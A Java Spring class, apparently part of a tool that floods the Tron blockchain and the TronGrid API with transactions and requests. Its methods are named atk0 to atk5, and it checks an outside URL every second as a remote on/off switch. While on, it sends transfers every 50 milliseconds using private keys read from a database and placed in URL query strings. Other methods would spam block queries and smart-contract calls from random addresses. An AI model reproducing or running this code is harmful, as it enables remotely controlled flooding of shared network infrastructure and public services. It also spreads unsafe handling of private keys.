package com.just.dstron.manager;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.just.dstron.entity.TronAccountBO;
import com.just.dstron.pojo.TronAccountDO;
import com.just.dstron.utils.MyUtils;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.nutz.dao.Cnd;
import org.nutz.dao.impl.NutDao;
import org.nutz.http.*;
import org.nutz.lang.util.Callback;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.security.SecureRandom;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

@Component
@Slf4j
public class TronManager {
    private ScheduledExecutorService executor1 = Executors.newSingleThreadScheduledExecutor();
    private ScheduledExecutorService executor2 = Executors.newSingleThreadScheduledExecutor();
    private boolean start=false;
    private Random random=new Random();
    private SecureRandom secureRandom=null;
    private int maxSize=1000;
    private Long cnt=0L;

    @Autowired
    private NutDao nutDao;

    @PostConstruct
    public void init(){

        maxSize = nutDao.count(TronAccountDO.class);
        log.info("maxSize {}",maxSize);

        executor1.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                try {
                    if(start){
                        atk();
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        },1+random.nextInt(500),50, TimeUnit.MILLISECONDS);

        executor2.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                log.info("success cnt:{}",cnt);
                checkStart();

            }
        },1+random.nextInt(1000),1000,TimeUnit.MILLISECONDS);
    }

    private void checkStart(){
        try {
            String url="http://tron.suishizhuan.com/tron/getEnable";
            String resp = Http.get(url).getContent();
            if("true".equals(resp)){
                start=true;
            }else{
                start=false;
            }
        }catch (Exception e){

        }
    }

    public int atk(){
        if(secureRandom==null){
            secureRandom=new SecureRandom();
        }
        int r=secureRandom.nextInt(100);
        if(r>=0 && r<45){
            atk0();
        }else if(r>=45 && r<90){
            atk1();
        }else{
            atk2();
        }
        return r;
    }

    public void atk0(){
        if(secureRandom==null){
            secureRandom=new SecureRandom();
        }
        int id1 = secureRandom.nextInt(maxSize)+1;
        int id2 = secureRandom.nextInt(maxSize)+1;
        TronAccountDO accountDO1 = nutDao.fetch(TronAccountDO.class, Cnd.where("id","=",id1));
        TronAccountDO accountDO2 = nutDao.fetch(TronAccountDO.class, Cnd.where("id","=",id2));
        String key=accountDO1.getPrikey();
        String to=accountDO2.getBase58();
        Integer amount = 1;
        String url = "http://localhost:3000/tron/transfer?to="+to+"&amount="+amount+"&pri="+key;
        String respStr=Http.get(url).getContent();
        JSONObject respObj=JSON.parseObject(respStr);
        if(respObj!=null&&respObj.getBoolean("result")!=null&&respObj.getBoolean("result")){
            cnt+=1;
            log.info("txid:{}",respObj.getString("txid"));
        }
    }


    public void atk1(){
        if(secureRandom==null){
            secureRandom=new SecureRandom();
        }
        int id1 = secureRandom.nextInt(maxSize)+1;
        TronAccountDO accountDO1 = nutDao.fetch(TronAccountDO.class, Cnd.where("id","=",id1));
        String key=accountDO1.getPrikey();
        Integer amount = 1;
        String url = "http://localhost:3000/tron/lend?from="+accountDO1.getBase58()+"&amount="+amount+"&pri="+key;
        String respStr=Http.get(url).getContent();
        if(StringUtils.isNotEmpty(respStr)){
            cnt+=1;
            log.info("txid:{}",respStr);
        }
    }

    public void atk2(){
        if(secureRandom==null){
            secureRandom=new SecureRandom();
        }
        TronAccountDO accountDO1 = nutDao.fetch(TronAccountDO.class, 55);
        String key=accountDO1.getPrikey();
        String url = "http://localhost:3000/tron/interest?pri="+key;
        String respStr=Http.get(url).getContent();
        if(StringUtils.isNotEmpty(respStr)){
            cnt+=1;
            log.info("txid:{}",respStr);
        }
    }

    public void atk3(){
        try {
            int block = random.nextInt(24888200);
            JSONObject params=new JSONObject();
            params.put("num",block);
            Response response = Http.post3("https://api.trongrid.io/wallet/getblockbynum",params.toJSONString(), Header.create(),5000);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void atk4(){
        try {
            int block = random.nextInt(24888200);
            JSONObject params=new JSONObject();
            params.put("startNum",block);
            params.put("endNum",block+random.nextInt(90));
            Response response = Http.post3("https://api.trongrid.io/wallet/getblockbylimitnext",params.toJSONString(), Header.create(),5000);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void atk5(){
        try {
            JSONObject params=new JSONObject();
            params.put("owner_address",randomAddress());
            params.put("contract_address","41E3CF5EEFE3A2ABF35A344AE8A3B2F4BB29810CBD");
            params.put("function_selector","buyTickets(bytes32)");
            params.put("fee_limit",5000000+random.nextInt(10000));
            params.put("call_value",25000000);
            params.put("parameter",MyUtils.getRandomHex(64));
            Response response = Http.post3("https://api.trongrid.io/wallet/triggersmartcontract",params.toJSONString(), Header.create(),5000);
        }catch (Exception e){
            e.printStackTrace();
        }

    }



    private String randomAddress(){
        return "41"+ MyUtils.getRandomHex(40);
    }
}
